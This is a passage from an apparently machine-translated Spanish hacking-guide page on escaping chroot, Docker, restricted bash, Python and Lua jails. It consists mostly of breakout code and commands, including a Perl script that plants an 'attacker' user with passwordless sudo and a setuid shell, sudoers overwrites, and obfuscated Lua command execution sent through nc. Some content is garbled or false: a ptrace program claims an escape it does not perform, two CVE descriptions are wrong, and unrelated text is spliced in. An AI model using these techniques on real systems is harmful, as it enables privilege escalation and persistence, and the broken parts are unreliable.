```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        exit(1);
    }

    if (chroot(argv[1]) != 0) {
        perror("chroot");
        exit(1);
    }

    if (chdir("/") != 0) {
        perror("chdir");
        exit(1);
    }

    system("/bin/bash");
    return 0;
}
```

</details>

```bash
gcc break_chroot.c -o break_chroot
./break_chroot /new_chroot
```

### Root + Mount

If you are **root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.

```bash
mkdir /tmp/new_root
mount --bind / /tmp/new_root
chroot /tmp/new_root
```

### Root + Ptrace

If you are **root** inside a chroot you **can escape** using **ptrace**. This because **ptrace is not affected** by chroot.

```bash
echo 0 > /proc/sys/kernel/yama/ptrace_scope
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

int main(int argc, char **argv) {
    pid_t pid;

    if (argc != 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        exit(1);
    }

    pid = atoi(argv[1]);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
        perror("ptrace");
        exit(1);
    }

    waitpid(pid, NULL, 0);

    if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) != 0) {
        perror("ptrace");
        exit(1);
    }

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) != 0) {
        perror("ptrace");
        exit(1);
    }

    waitpid(pid, NULL, 0);

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) != 0) {
        perror("ptrace");
        exit(1);
    }

    printf("Escaped!\n");

    return 0;
}
```

```bash
gcc break_ptrace.c -o break_ptrace
./break_ptrace <pid>
```

## Docker Escapes

### Docker Breakouts

#### Docker Breakout - CAP_SYS_ADMIN

If you have **CAP_SYS_ADMIN** capability you can create a new container with **--privileged** flag and then **mount the host filesystem**.

```bash
docker run -it --rm --cap-add=SYS_ADMIN --privileged ubuntu bash
mount /dev/sda1 /mnt
```

#### Docker Breakout - CAP_DAC_OVERRIDE

If you have **CAP_DAC_OVERRIDE** capability you can **read/write any file** in the host filesystem.

```bash
docker run -it --rm --cap-add DAC_OVERRIDE ubuntu bash
cat /etc/shadow
```

#### Docker Breakout - CAP_SYS_PTRACE

If you have **CAP_SYS_PTRACE** capability you can **ptrace any process** in the host.

```bash
docker run -it --rm --cap-add SYS_PTRACE ubuntu bash
strace -p1
```

### Docker Escapes - CVEs

#### Docker Escape - CVE-2019-5736

This vulnerability allows a **container to overwrite the host `runc` binary** (used by Docker) and therefore **run as root** in the host.

```bash
docker run -it --rm -v /usr:/usr ubuntu bash
echo "echo 0 > /proc/sys/kernel/yama/ptrace_scope" > /usr/bin/docker-runc
chmod +x /usr/bin/docker-runc
```

#### Docker Escape - CVE-2019-14271

This vulnerability allows a **container to overwrite the host `sudoers` file** and therefore **run any command as root**.

```bash
docker run -it --rm -v /etc:/etc ubuntu bash
echo "root ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers
```
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>

Python

</details>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl es un lenguaje de programación interpretado de propósito general que se utiliza a menudo en la administración de sistemas y en la creación de scripts. Es posible que un usuario limitado tenga acceso a Perl y pueda ejecutar scripts de Perl. Si es así, puede intentar ejecutar un script de Perl que le permita obtener una shell con permisos elevados. 

Un ejemplo de script de Perl que puede ser útil para la escalada de privilegios es el siguiente:

```perl
#!/usr/bin/perl
use strict;
use warnings;
use POSIX qw(setuid);

my $uid = $<;
my $gid = $(;

if ($uid != 0) {
    print "[-] You need to be root to run this script\n";
    exit(1);
}

my $user = "attacker";
my $home = "/home/$user";
my $shell = "/bin/bash";

if (system("useradd -d $home -s $shell $user") != 0) {
    print "[-] Failed to create user\n";
    exit(1);
}

if (system("echo '$user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/$user") != 0) {
    print "[-] Failed to add user to sudoers\n";
    exit(1);
}

if (system("cp /bin/bash $home/bash; chmod +s $home/bash") != 0) {
    print "[-] Failed to create setuid shell\n";
    exit(1);
}

print "[+] User created: $user\n";
print "[+] Setuid shell created: $home/bash\n";
```

Este script crea un nuevo usuario con el nombre "attacker", le da permisos de sudo sin contraseña y crea una shell setuid en su directorio de inicio. Para ejecutar este script, simplemente guárdelo en un archivo y ejecute `perl script.pl`. Después de ejecutar el script, puede iniciar sesión como el usuario "attacker" y ejecutar comandos con permisos elevados utilizando `sudo`.
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + FD guardado

{% hint style="warning" %}
Este caso es similar al anterior, pero en este caso el **atacante almacena un descriptor de archivo al directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD fuera** del chroot, lo accede y **escapa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Se puede pasar FD a través de Unix Domain Sockets, por lo que:

* Crear un proceso hijo (fork)
* Crear UDS para que el padre y el hijo puedan comunicarse
* Ejecutar chroot en el proceso hijo en una carpeta diferente
* En el proceso padre, crear un FD de una carpeta que está fuera del nuevo chroot del proceso hijo
* Pasar al proceso hijo ese FD usando el UDS
* El proceso hijo cambia su directorio actual a ese FD, y debido a que está fuera de su chroot, escapará de la cárcel.
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Montar el dispositivo raíz (/) en un directorio dentro del chroot
* Ejecutar chroot en ese directorio

Esto es posible en Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montar procfs en un directorio dentro del chroot (si aún no está montado)
* Buscar un pid que tenga una entrada de root/cwd diferente, como: /proc/1/root
* Ejecutar chroot en esa entrada
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Crear un Fork (proceso hijo) y ejecutar chroot en una carpeta diferente más profunda en el sistema de archivos y cambiar el directorio actual a ella
* Desde el proceso padre, mover la carpeta donde se encuentra el proceso hijo a una carpeta anterior al chroot del hijo
* Este proceso hijo se encontrará fuera del chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Hace tiempo los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible por defecto
* De todas formas, si es posible, se podría ptracear un proceso y ejecutar un shellcode dentro de él ([ver este ejemplo](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Jaulas de Bash

### Enumeración

Obtener información sobre la cárcel:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modificar PATH

Verifique si puede modificar la variable de entorno PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Crear script

Comprueba si puedes crear un archivo ejecutable con _/bin/bash_ como contenido.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtener bash desde SSH

Si estás accediendo a través de ssh, puedes utilizar este truco para ejecutar una shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Declaración
```bash
declare -n PATH; export PATH=/bin;bash -i
 
BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Es posible sobrescribir, por ejemplo, el archivo sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Otros trucos

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/)\
**También puede ser interesante la página:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Jaulas de Python

Trucos para escapar de las jaulas de Python en la siguiente página:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jaulas de Lua

En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval con ejecución de comandos:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algunos trucos para **llamar funciones de una librería sin usar puntos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
# Enumerar funciones de una biblioteca:

Para enumerar las funciones de una biblioteca, podemos utilizar el comando `nm`. Este comando muestra los símbolos (incluyendo las funciones) de un archivo objeto o de una biblioteca compartida.

Para mostrar solo las funciones de una biblioteca, podemos utilizar el siguiente comando:

```bash
nm -gC /ruta/a/biblioteca.so | grep ' T '
```

Este comando mostrará solo las funciones de la biblioteca, una por línea. El parámetro `-g` indica que se deben mostrar los símbolos globales, `-C` indica que se deben mostrar los nombres de las funciones en formato legible para el usuario y `grep ' T '` filtra solo las funciones (los símbolos que comienzan con `T` indican funciones).

También podemos utilizar el comando `objdump` para mostrar las funciones de una biblioteca:

```bash
objdump -T /ruta/a/biblioteca.so | grep 'FUNC'
```

Este comando mostrará todas las funciones de la biblioteca, una por línea. El parámetro `-T` indica que se deben mostrar las tablas de símbolos y `grep 'FUNC'` filtra solo las funciones.
```bash
for k,v in pairs(string) do print(k,v) end
```
Tenga en cuenta que cada vez que ejecute el comando anterior en un **entorno lua diferente, el orden de las funciones cambia**. Por lo tanto, si necesita ejecutar una función específica, puede realizar un ataque de fuerza bruta cargando diferentes entornos lua y llamando a la primera función de la biblioteca "le":
```bash
#In this scenario you could BF the victim that is generating a new lua environment 
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtener una shell interactiva de Lua**: Si estás dentro de una shell limitada de Lua, puedes obtener una nueva shell de Lua (y con suerte ilimitada) llamando a:
```bash
debug.debug()
```
## Referencias

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositivas: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
